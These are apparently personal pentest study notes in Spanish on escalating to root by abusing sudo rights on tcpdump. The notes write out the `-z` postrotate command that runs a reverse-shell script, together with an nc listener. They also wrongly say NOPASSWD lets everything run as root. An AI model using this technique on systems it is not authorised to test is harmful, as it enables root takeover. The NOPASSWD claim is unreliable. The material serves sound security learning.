
Se pueden conceder privs sudo a un usuario para un solo comando, scripts etc especificando su ruta

Si pone `NOPASSWD` significa que podemos ejecutar todo como root

Esto se especifica en `/etc/sudoers` y se puede ejecutar `sudo -l` para verlo:

```
sudo -l
```
![[Pasted image 20260917155534.png]]

	En este caso nuestro usuario puede ejecutar como root tcpdump sin saber la contraseña de root

Podemos tratar de usar `tcpdump` que se ejecuta como root para escalar privs:

```
man tcpdump
> -z postrotate-command
```
![[Pasted image 20260917155654.png]]

	-z se puede usar para ejeuctar un script shell que nos envie una reverse shell. Se usa con -C o -W

Creamos un archivo /tmp/.test que contenga la reverse shell y lo ejecutamos con -z

![[Pasted image 20260917160424.png]]

Iniciamos un listener nc en la kali

```
nc -nvlp PUERTO
```

Ejecutamos tcpdump con postrotate-command:

```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
![[Pasted image 20260917160530.png]]

- l: linebuffering en stdout/stderr
- n: no resuelve nombres de hosts
- -i eth0: captura el trafico de esa interfaz
- -w /dev/null: escribe los paquetes en /dev/null (para no guardarlos)
- -W 1: limite de 1 archivo tras la primera rotacion
- -G 1: rota cada 1s
- -z /tmp/.test: al cerrar el savefile ejecuta `/tmp/.test /dev/null` usando el nombre del archivo rotado como argumento
